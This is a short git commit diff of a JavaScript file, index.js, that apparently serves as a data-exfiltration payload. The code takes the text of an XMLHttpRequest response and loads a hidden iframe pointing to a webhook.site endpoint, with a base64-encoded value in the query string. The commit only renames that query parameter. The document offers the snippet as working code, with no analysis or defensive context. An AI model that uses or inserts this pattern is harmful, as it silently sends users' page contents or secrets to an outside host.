070734a41594b3aac34ae65be48752adc083f553
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 23:14:47 +0200

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ function reqListener () {
     var raw = this.responseText;
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
-	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?ff="+b64;
+	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+b64;
 	document.body.appendChild(iframe);
 } 
 var oReq = new XMLHttpRequest(); 
